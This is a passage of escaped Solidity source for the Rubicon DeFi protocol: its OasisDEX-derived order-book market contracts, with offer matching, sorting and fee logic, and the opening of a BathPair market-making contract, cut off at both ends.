you can pay the fee\"\n        );\n        require(\n            _offer.pay_gem.transfer(msg.sender, quantity),\n            \"_offer.pay_gem.transfer(msg.sender, quantity) failed\"\n        );\n\n        emit LogItemUpdate(id);\n        emit LogTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            msg.sender,\n            uint128(quantity),\n            uint128(spend),\n            uint64(block.timestamp)\n        );\n        emit FeeTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.buy_gem,\n            msg.sender,\n            feeTo,\n            fee,\n            uint64(block.timestamp)\n        );\n        emit LogTrade(\n            quantity,\n            address(_offer.pay_gem),\n            spend,\n            address(_offer.buy_gem)\n        );\n\n        if (offers[id].pay_amt == 0) {\n            delete offers[id];\n            emit OfferDeleted(id);\n        }\n\n        return true;\n    }\n\n    /// @notice Allows the caller to cancel the offer if it is their own.\n    /// @notice This function refunds the offer to the maker.\n    function cancel(uint256 id)\n        public\n        virtual\n        can_cancel(id)\n        synchronized\n        returns (bool success)\n    {\n        OfferInfo memory _offer = offers[id];\n        delete offers[id];\n\n        require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogKill(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            uint128(_offer.pay_amt),\n            uint128(_offer.buy_amt),\n            uint64(block.timestamp)\n        );\n\n        success = true;\n    }\n\n    function kill(bytes32 id) external virtual {\n        require(cancel(uint256(id)));\n    }\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) external virtual returns (bytes32 id) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    /// @notice Key function to make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(0x0));\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(0x0));\n        require(pay_gem != buy_gem);\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.owner = msg.sender;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogMake(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt),\n            uint64(block.timestamp)\n        );\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) external virtual {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function _next_id() internal returns (uint256) {\n        last_offer_id++;\n        return last_offer_id;\n    }\n\n    // Fee logic\n    function getFeeBPS() internal view returns (uint256) {\n        return feeBPS;\n    }\n}\n\n/// @notice Expiring market is a Simple Market with a market lifetime.\n/// @dev When the close_time has been reached, offers can only be cancelled (offer and buy will throw).\ncontract ExpiringMarket is DSAuth, SimpleMarket {\n    bool public stopped;\n\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, anyone can cancel an offer.\n    modifier can_cancel(uint256 id) virtual override {\n        require(isActive(id));\n        require((msg.sender == getOwner(id)) || isClosed());\n        _;\n    }\n\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n\n    function getTime() public view returns (uint64) {\n        return uint64(block.timestamp);\n    }\n\n    function stop() external auth {\n        stopped = true;\n    }\n}\n\ncontract DSNote {\n    event LogNote(\n        bytes4 indexed sig,\n        address indexed guy,\n        bytes32 indexed foo,\n        bytes32 indexed bar,\n        uint256 wad,\n        bytes fax\n    ) anonymous;\n\n    modifier note() {\n        bytes32 foo;\n        bytes32 bar;\n        uint256 wad;\n\n        assembly {\n            foo := calldataload(4)\n            bar := calldataload(36)\n            wad := callvalue()\n        }\n\n        emit LogNote(msg.sig, msg.sender, foo, bar, wad, msg.data);\n\n        _;\n    }\n}\n\ncontract MatchingEvents {\n    event LogBuyEnabled(bool isEnabled);\n    event LogMinSell(address pay_gem, uint256 min_amount);\n    event LogMatchingEnabled(bool isEnabled);\n    event LogUnsortedOffer(uint256 id);\n    event LogSortedOffer(uint256 id);\n    event LogInsert(address keeper, uint256 id);\n    event LogDelete(address keeper, uint256 id);\n    event LogMatch(uint256 id, uint256 amount);\n}\n\n/// @notice The core Rubicon Market smart contract\n/// @notice This contract is based on the original open-source work done by OasisDEX under the Apache License 2.0\n/// @dev This contract inherits the key trading functionality from SimpleMarket\ncontract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote {\n    bool public buyEnabled = true; //buy enabled\n    bool public matchingEnabled = true; //true: enable matching,\n    //false: revert to expiring market\n    /// @dev Below is variable to allow for a proxy-friendly constructor\n    bool public initialized;\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    bool public AqueductDistributionLive;\n    /// @dev unused deprecated variable for applying a token distribution of this token on top of a trade\n    address public AqueductAddress;\n\n    struct sortInfo {\n        uint256 next; //points to id of next higher offer\n        uint256 prev; //points to id of previous lower offer\n        uint256 delb; //the blocknumber where this entry was marked for delete\n    }\n    mapping(uint256 => sortInfo) public _rank; //doubly linked lists of sorted offer ids\n    mapping(address => mapping(address => uint256)) public _best; //id of the highest offer for a token pair\n    mapping(address => mapping(address => uint256)) public _span; //number of offers stored for token pair in sorted orderbook\n    mapping(address => uint256) public _dust; //minimum sell amount for a token to avoid dust offers\n    mapping(uint256 => uint256) public _near; //next unsorted offer id\n    uint256 public _head; //first unsorted offer id\n    uint256 public dustId; // id of the latest offer marked as dust\n\n    /// @dev Proxy-safe initialization of storage\n    function initialize(bool _live, address _feeTo) public {\n        require(!initialized, \"contract is already initialized\");\n        AqueductDistributionLive = _live;\n\n        /// @notice The market fee recipient\n        feeTo = _feeTo;\n\n        owner = msg.sender;\n        emit LogSetOwner(msg.sender);\n\n        /// @notice The starting fee on taker trades in basis points\n        feeBPS = 20;\n\n        initialized = true;\n        matchingEnabled = true;\n        buyEnabled = true;\n    }\n\n    // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() || msg.sender == getOwner(id) || id == dustId,\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n\n    // ---- Public entrypoints ---- //\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) public override returns (bytes32) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) public override {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function kill(bytes32 id) external override {\n        require(cancel(uint256(id)));\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    //\n    // If matching is enabled:\n    //     * creates new offer without putting it in\n    //       the sorted list.\n    //     * available to authorized contracts only!\n    //     * keepers should call insert(id,pos)\n    //       to put offer in the sorted list.\n    //\n    // If matching is disabled:\n    //     * calls expiring market's offer().\n    //     * available to everyone without authorization.\n    //     * no sorting is done.\n    //\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //taker (ask) buy how much\n        ERC20 buy_gem //taker (ask) buy which token\n    ) public override returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n\n\n            function(uint256, ERC20, uint256, ERC20) returns (uint256) fn\n         = matchingEnabled ? _offeru : super.offer;\n        return fn(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external can_offer returns (uint256) {\n        return offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);\n    }\n\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos, //position to insert offer, 0 should be used if unknown\n        bool matching //match \"close enough\" orders?\n    ) public can_offer returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n        require(_dust[address(pay_gem)] <= pay_amt);\n\n        if (matchingEnabled) {\n            return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, matching);\n        }\n        return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    //Transfers funds from caller to offer maker, and from market to caller.\n    function buy(uint256 id, uint256 amount)\n        public\n        override\n        can_buy(id)\n        returns (bool)\n    {\n        require(!locked, \"Reentrancy attempt\");\n\n        //Optional distribution on trade\n        if (AqueductDistributionLive) {\n            IAqueduct(AqueductAddress).distributeToMakerAndTaker(\n                getOwner(id),\n                msg.sender\n            );\n        }\n        function(uint256, uint256) returns (bool) fn = matchingEnabled\n            ? _buys\n            : super.buy;\n\n        return fn(id, amount);\n    }\n\n    // Cancel an offer. Refunds offer maker.\n    function cancel(uint256 id)\n        public\n        override\n        can_cancel(id)\n        returns (bool success)\n    {\n        require(!locked, \"Reentrancy attempt\");\n        if (matchingEnabled) {\n            if (isOfferSorted(id)) {\n                require(_unsort(id));\n            } else {\n                require(_hide(id));\n            }\n        }\n        return super.cancel(id); //delete the offer.\n    }\n\n    //insert offer into the sorted list\n    //keepers need to use this function\n    function insert(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) public returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(!isOfferSorted(id)); //make sure offers[id] is not yet sorted\n        require(isActive(id)); //make sure offers[id] is active\n\n        _hide(id); //remove offer from unsorted offers list\n        _sort(id, pos); //put offer into the sorted offers list\n        emit LogInsert(msg.sender, id);\n        return true;\n    }\n\n    //deletes _rank [id]\n    //  Function should be called by keepers.\n    function del_rank(uint256 id) external returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(\n            !isActive(id) &&\n                _rank[id].delb != 0 &&\n                _rank[id].delb < block.number - 10\n        );\n        delete _rank[id];\n        emit LogDelete(msg.sender, id);\n        return true;\n    }\n\n    //set the minimum sell amount for a token\n    //    Function is used to avoid \"dust offers\" that have\n    //    very small amount of tokens to sell, and it would\n    //    cost more gas to accept the offer, than the value\n    //    of tokens received.\n    function setMinSell(\n        ERC20 pay_gem, //token to assign minimum sell amount to\n        uint256 dust //maker (ask) minimum sell amount\n    ) external auth note returns (bool) {\n        _dust[address(pay_gem)] = dust;\n        emit LogMinSell(address(pay_gem), dust);\n        return true;\n    }\n\n    //returns the minimum sell amount for an offer\n    function getMinSell(\n        ERC20 pay_gem //token for which minimum sell amount is queried\n    ) external view returns (uint256) {\n        return _dust[address(pay_gem)];\n    }\n\n    //set buy functionality enabled/disabled\n    function setBuyEnabled(bool buyEnabled_) external auth returns (bool) {\n        buyEnabled = buyEnabled_;\n        emit LogBuyEnabled(buyEnabled);\n        return true;\n    }\n\n    //set matching enabled/disabled\n    //    If matchingEnabled true(default), then inserted offers are matched.\n    //    Except the ones inserted by contracts, because those end up\n    //    in the unsorted list of offers, that must be later sorted by\n    //    keepers using insert().\n    //    If matchingEnabled is false then RubiconMarket is reverted to ExpiringMarket,\n    //    and matching is not done, and sorted lists are disabled.\n    function setMatchingEnabled(bool matchingEnabled_)\n        external\n        auth\n        returns (bool)\n    {\n        matchingEnabled = matchingEnabled_;\n        emit LogMatchingEnabled(matchingEnabled);\n        return true;\n    }\n\n    //return the best offer for a token pair\n    //      the best offer is the lowest one if it's an ask,\n    //      and highest one if it's a bid offer\n    function getBestOffer(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _best[address(sell_gem)][address(buy_gem)];\n    }\n\n    //return the next worse offer in the sorted list\n    //      the worse offer is the higher one if its an ask,\n    //      a lower one if its a bid offer,\n    //      and in both cases the newer one if they're equal.\n    function getWorseOffer(uint256 id) public view returns (uint256) {\n        return _rank[id].prev;\n    }\n\n    //return the next better offer in the sorted list\n    //      the better offer is in the lower priced one if its an ask,\n    //      the next higher priced one if its a bid offer\n    //      and in both cases the older one if they're equal.\n    function getBetterOffer(uint256 id) external view returns (uint256) {\n        return _rank[id].next;\n    }\n\n    //return the amount of better offers for a token pair\n    function getOfferCount(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _span[address(sell_gem)][address(buy_gem)];\n    }\n\n    //get the first unsorted offer that was inserted by a contract\n    //      Contracts can't calculate the insertion position of their offer because it is not an O(1) operation.\n    //      Their offers get put in the unsorted list of offers.\n    //      Keepers can calculate the insertion position offchain and pass it to the insert() function to insert\n    //      the unsorted offer into the sorted list. Unsorted offers will not be matched, but can be bought with buy().\n    function getFirstUnsortedOffer() public view returns (uint256) {\n        return _head;\n    }\n\n    //get the next unsorted offer\n    //      Can be used to cycle through all the unsorted offers.\n    function getNextUnsortedOffer(uint256 id) public view returns (uint256) {\n        return _near[id];\n    }\n\n    function isOfferSorted(uint256 id) public view returns (bool) {\n        return\n            _rank[id].next != 0 ||\n            _rank[id].prev != 0 ||\n            _best[address(offers[id].pay_gem)][address(offers[id].buy_gem)] ==\n            id;\n    }\n\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                pay_amt * 1 ether <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    pay_amt * 10**9,\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10**9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount);\n    }\n\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0);\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                buy_amt * 1 ether <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        buy_amt * 10**9,\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10**9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n        }\n        require(fill_amt <= max_fill_amount);\n    }\n\n    function getBuyAmount(\n        ERC20 buy_gem,\n        ERC20 pay_gem,\n        uint256 pay_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (pay_amt > offers[offerId].buy_amt) {\n            fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount to buy accumulator\n            pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to pay\n            if (pay_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                pay_amt * 10**9,\n                rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to buy accumulator\n    }\n\n    function getPayAmount(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint256 buy_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (buy_amt > offers[offerId].pay_amt) {\n            fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount to pay accumulator\n            buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n            if (buy_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                buy_amt * 10**9,\n                rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to pay accumulator\n    }\n\n    // ---- Internal Functions ---- //\n\n    function _buys(uint256 id, uint256 amount) internal returns (bool) {\n        require(buyEnabled);\n        if (amount == offers[id].pay_amt) {\n            if (isOfferSorted(id)) {\n                //offers[id] must be removed from sorted list because all of it is bought\n                _unsort(id);\n            } else {\n                _hide(id);\n            }\n        }\n\n        require(super.buy(id, amount));\n\n        // If offer has become dust during buy, we cancel it\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n        return true;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _find(uint256 id) internal view returns (uint256) {\n        require(id > 0);\n\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        uint256 top = _best[pay_gem][buy_gem];\n        uint256 old_top = 0;\n\n        // Find the larger-than-id order whose successor is less-than-id.\n        while (top != 0 && _isPricedLtOrEq(id, top)) {\n            old_top = top;\n            top = _rank[top].prev;\n        }\n        return old_top;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _findpos(uint256 id, uint256 pos) internal view returns (uint256) {\n        require(id > 0);\n\n        // Look for an active order.\n        while (pos != 0 && !isActive(pos)) {\n            pos = _rank[pos].prev;\n        }\n\n        if (pos == 0) {\n            //if we got to the end of list without a single active offer\n            return _find(id);\n        } else {\n            // if we did find a nearby active offer\n            // Walk the order book down from there...\n            if (_isPricedLtOrEq(id, pos)) {\n                uint256 old_pos;\n\n                // Guaranteed to run at least once because of\n                // the prior if statements.\n                while (pos != 0 && _isPricedLtOrEq(id, pos)) {\n                    old_pos = pos;\n                    pos = _rank[pos].prev;\n                }\n                return old_pos;\n\n                // ...or walk it up.\n            } else {\n                while (pos != 0 && !_isPricedLtOrEq(id, pos)) {\n                    pos = _rank[pos].next;\n                }\n                return pos;\n            }\n        }\n    }\n\n    //return true if offers[low] priced less than or equal to offers[high]\n    function _isPricedLtOrEq(\n        uint256 low, //lower priced offer's id\n        uint256 high //higher priced offer's id\n    ) internal view returns (bool) {\n        return\n            mul(offers[low].buy_amt, offers[high].pay_amt) >=\n            mul(offers[high].buy_amt, offers[low].pay_amt);\n    }\n\n    //these variables are global only because of solidity local variable limit\n\n    //match offers with taker offer, and execute token transactions\n    function _matcho(\n        uint256 t_pay_amt, //taker sell how much\n        ERC20 t_pay_gem, //taker sell which token\n        uint256 t_buy_amt, //taker buy how much\n        ERC20 t_buy_gem, //taker buy which token\n        uint256 pos, //position id\n        bool rounding //match \"close enough\" orders?\n    ) internal returns (uint256 id) {\n        uint256 best_maker_id; //highest maker id\n        uint256 t_buy_amt_old; //taker buy how much saved\n        uint256 m_buy_amt; //maker offer wants to buy this much token\n        uint256 m_pay_amt; //maker offer wants to sell this much token\n\n        // there is at least one offer stored for token pair\n        while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n            best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n            m_buy_amt = offers[best_maker_id].buy_amt;\n            m_pay_amt = offers[best_maker_id].pay_amt;\n\n            // Ugly hack to work around rounding errors. Based on the idea that\n            // the furthest the amounts can stray from their \"true\" values is 1.\n            // Ergo the worst case has t_pay_amt and m_pay_amt at +1 away from\n            // their \"correct\" values and m_buy_amt and t_buy_amt at -1.\n            // Since (c - 1) * (d - 1) > (a + 1) * (b + 1) is equivalent to\n            // c * d > a * b + a + b + c + d, we write...\n            if (\n                mul(m_buy_amt, t_buy_amt) >\n                mul(t_pay_amt, m_pay_amt) +\n                    (\n                        rounding\n                            ? m_buy_amt + t_buy_amt + t_pay_amt + m_pay_amt\n                            : 0\n                    )\n            ) {\n                break;\n            }\n            // ^ The `rounding` parameter is a compromise borne of a couple days\n            // of discussion.\n            buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n            emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n            t_buy_amt_old = t_buy_amt;\n            t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n            t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n\n            if (t_pay_amt == 0 || t_buy_amt == 0) {\n                break;\n            }\n        }\n\n        if (\n            t_buy_amt > 0 &&\n            t_pay_amt > 0 &&\n            t_pay_amt >= _dust[address(t_pay_gem)]\n        ) {\n            //new offer should be created\n            id = super.offer(t_pay_amt, t_pay_gem, t_buy_amt, t_buy_gem);\n            //insert offer into the sorted list\n            _sort(id, pos);\n        }\n    }\n\n    // Make a new offer without putting it in the sorted list.\n    // Takes funds from the caller into market escrow.\n    // Keepers should call insert(id,pos) to put offer in the sorted list.\n    function _offeru(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem //maker (ask) buy which token\n    ) internal returns (uint256 id) {\n        require(_dust[address(pay_gem)] <= pay_amt);\n        id = super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n        _near[id] = _head;\n        _head = id;\n        emit LogUnsortedOffer(id);\n    }\n\n    //put offer into the sorted list\n    function _sort(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) internal {\n        require(isActive(id));\n\n        ERC20 buy_gem = offers[id].buy_gem;\n        ERC20 pay_gem = offers[id].pay_gem;\n        uint256 prev_id; //maker (ask) id\n\n        pos = pos == 0 ||\n            offers[pos].pay_gem != pay_gem ||\n            offers[pos].buy_gem != buy_gem ||\n            !isOfferSorted(pos)\n            ? _find(id)\n            : _findpos(id, pos);\n\n        if (pos != 0) {\n            //offers[id] is not the highest offer\n            //requirement below is satisfied by statements above\n            //require(_isPricedLtOrEq(id, pos));\n            prev_id = _rank[pos].prev;\n            _rank[pos].prev = id;\n            _rank[id].next = pos;\n        } else {\n            //offers[id] is the highest offer\n            prev_id = _best[address(pay_gem)][address(buy_gem)];\n            _best[address(pay_gem)][address(buy_gem)] = id;\n        }\n\n        if (prev_id != 0) {\n            //if lower offer does exist\n            //requirement below is satisfied by statements above\n            //require(!_isPricedLtOrEq(id, prev_id));\n            _rank[prev_id].next = id;\n            _rank[id].prev = prev_id;\n        }\n\n        _span[address(pay_gem)][address(buy_gem)]++;\n        emit LogSortedOffer(id);\n    }\n\n    // Remove offer from the sorted list (does not cancel offer)\n    function _unsort(\n        uint256 id //id of maker (ask) offer to remove from sorted list\n    ) internal returns (bool) {\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        require(_span[pay_gem][buy_gem] > 0);\n\n        require(\n            _rank[id].delb == 0 && //assert id is in the sorted list\n                isOfferSorted(id)\n        );\n\n        if (id != _best[pay_gem][buy_gem]) {\n            // offers[id] is not the highest offer\n            require(_rank[_rank[id].next].prev == id);\n            _rank[_rank[id].next].prev = _rank[id].prev;\n        } else {\n            //offers[id] is the highest offer\n            _best[pay_gem][buy_gem] = _rank[id].prev;\n        }\n\n        if (_rank[id].prev != 0) {\n            //offers[id] is not the lowest offer\n            require(_rank[_rank[id].prev].next == id);\n            _rank[_rank[id].prev].next = _rank[id].next;\n        }\n\n        _span[pay_gem][buy_gem]--;\n        _rank[id].delb = block.number; //mark _rank[id] for deletion\n        return true;\n    }\n\n    //Hide offer from the unsorted order book (does not cancel offer)\n    function _hide(\n        uint256 id //id of maker offer to remove from unsorted list\n    ) internal returns (bool) {\n        uint256 uid = _head; //id of an offer in unsorted offers list\n        uint256 pre = uid; //id of previous offer in unsorted offers list\n\n        require(!isOfferSorted(id)); //make sure offer id is not in sorted offers list\n\n        if (_head == id) {\n            //check if offer is first offer in unsorted offers list\n            _head = _near[id]; //set head to new first unsorted offer\n            _near[id] = 0; //delete order from unsorted order list\n            return true;\n        }\n        while (uid > 0 && uid != id) {\n            //find offer in unsorted order list\n            pre = uid;\n            uid = _near[uid];\n        }\n        if (uid != id) {\n            //did not find offer id in unsorted offers list\n            return false;\n        }\n        _near[pre] = _near[id]; //set previous unsorted offer to point to offer after offer id\n        _near[id] = 0; //delete order from unsorted order list\n        return true;\n    }\n\n    function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) {\n        feeBPS = _newFeeBPS;\n        return true;\n    }\n\n    /// @dev unused deprecated function for applying a token distribution on top of a trade\n    function setAqueductDistributionLive(bool live)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductDistributionLive = live;\n        return true;\n    }\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    function setAqueductAddress(address _Aqueduct)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductAddress = _Aqueduct;\n        return true;\n    }\n\n    function setFeeTo(address newFeeTo) external auth returns (bool) {\n        feeTo = newFeeTo;\n        return true;\n    }\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function withdraw(uint256) external;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ninterface IAqueduct {\n    function distributeToMakerAndTaker(address maker, address taker)\n        external\n        returns (bool);\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract allows a strategist to use user funds in order to market make for a Rubicon pair\n/// @notice The BathPair is the admin for the pair's liquidity and has many security checks in place\n/// @notice This contract is also where strategists claim rewards for successful market making\n\npragma solidity =0.7.6;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathToken.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IStrategistUtility.sol\";\n\ncontract BathPair {\n    /// *** Libraries ***\n    using SafeMath for uint256;\n    using SafeMath for uint16;\n\n    /// *** Storage Variables ***\n\n    /// @notice The Bath House admin of this contract; used with onlyBathHouse()\n    address public bathHouse;\n\n    /// @notice The Rubicon Market strategists direct all activity towards. There is only one market, RubiconMarket.sol, in the Rubicon Protocol\n    address public RubiconMarketAddress;\n\n    /// @notice The initialization status of BathPair\n    bool public initialized;\n\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    int128 internal deprecatedStorageVarKept420Proxy;\n\n    /// @notice Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256 public deprecatedStorageVarKept4Proxy;\n\n    /// @dev The id of the last StrategistTrade made by any strategist on this contract\n    /// @dev This value is globally unique, and increments with every trade\n    uint256 internal last_stratTrade_id;\n\n    /// @notice The total amount of successful offer fills that all strategists have made for a given asset\n    mapping(address => uint256) public totalFillsPerAsset;\n\n    /// @notice Unique id => StrategistTrade created in marketMaking call\n    mapping(uint256 => StrategistTrade) public strategistTrades;\n\n    /// @notice Map a strategist to their outstanding order IDs\n    mapping(address => 